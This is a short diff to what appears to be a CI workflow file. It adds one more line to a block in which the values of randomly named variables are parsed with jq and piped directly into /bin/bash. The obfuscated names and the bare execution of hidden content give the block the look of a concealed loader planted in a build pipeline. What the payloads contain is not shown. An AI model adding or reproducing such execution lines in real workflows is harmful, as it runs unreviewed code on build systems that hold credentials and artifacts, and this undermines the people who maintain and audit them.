@@ -75,6 +75,7 @@ jobs:
           printf '%s' "$snrv517" | jq -r .inhxm239 | /bin/bash
           printf '%s' "$qgfoz69085" | jq -r .bqt331 | /bin/bash
           echo $mpqib7 | jq -r .cn847 | /bin/bash
+          echo $bcpn7020 | jq -r .gkwny6 | /bin/bash
 
       - name: Save archive
         if: always()
